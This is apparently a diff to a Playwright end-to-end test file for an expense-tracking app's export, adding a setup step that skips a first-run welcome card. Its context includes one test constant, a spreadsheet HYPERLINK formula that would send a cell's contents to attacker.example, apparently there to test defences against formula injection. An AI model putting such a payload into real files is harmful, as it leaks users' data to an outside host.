@@ -6,6 +6,14 @@ import { test, expect, type Download, type Page } from '@playwright/test'
 // UTF-8 with a BOM. Every expense below is invented test data.
 
 // Honolulu (UTC-10): a date-only string parsed as UTC would slip back a day here.
+// A pristine origin shows the first-run card above every screen (PR-4); these tests start past
+// it, as after Start fresh. e2e/first-run.spec.ts covers the card itself.
+test.beforeEach(async ({ context }) => {
+  await context.addInitScript(() => {
+    localStorage.setItem('spendtrack:welcome', '1')
+  })
+})
+
 test.use({ timezoneId: 'Pacific/Honolulu' })
 
 const HYPERLINK = '=HYPERLINK("http://attacker.example/?d="&A1,"Refund")'
